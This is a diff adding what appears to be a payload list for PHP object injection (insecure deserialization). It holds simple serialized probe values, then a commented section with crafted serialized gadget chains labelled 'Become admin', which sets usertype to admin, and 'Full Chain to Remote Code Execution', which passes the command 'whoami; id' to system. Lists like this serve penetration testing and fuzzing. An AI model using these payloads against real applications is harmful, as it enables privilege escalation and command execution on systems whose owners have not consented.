@@ -1,0 +1,43 @@
+O:1:"A":1:{s:1:"a";s:1:"b";}
+O:8:"stdClass":1:{s:4:"test";s:4:"data";}
+<!-- PHP Object Injection often requires knowledge of the source code classes -->
+<!-- Simple unexpected value -->
+s:4:"test";
+i:1;
+b:1;
+a:2:{i:0;s:4:"test";i:1;s:4:"data";}
+
+/*
+# Become admin serialized string
+O:6:"Second":6:{
+  s:12:"\00Second\00data";a:0:{}
+  s:16:"\00Second\00usertype";s:5:"admin"
+  s:16:"\00Second\00username";s:6:"hacker"
+  s:13:"\00Second\00_func";s:7:"print_r"
+  s:6:"member";s:4:"data"
+  s:6:"method";s:7:"destroy"
+}
+
+# Full Chain to Remote Code Execution
+
+O:6:"Second":6:{
+  s:12:"\00Second\00data";a:1:{
+    s:4:"data";O:5:"Third":2:{
+      s:4:"data";a:0:{}
+      s:3:"obj";O:6:"Second":6:{
+        s:12:"\00Second\00data";a:0:{}
+        s:16:"\00Second\00usertype";s:0:""
+        s:16:"\00Second\00username";s:0:""
+        s:13:"\00Second\00_func";s:6:"system"
+        s:6:"member";s:0:""
+        s:6:"method";s:0:""
+        }
+  }
+  s:16:"\00Second\00usertype";s:5:"admin"
+  s:16:"\00Second\00username";s:6:"hacker"
+  s:13:"\00Second\00_func";s:6:"system"
+  s:6:"member";s:10:"whoami; id"
+  s:6:"method";s:7:"execute"
+}
+
+*/
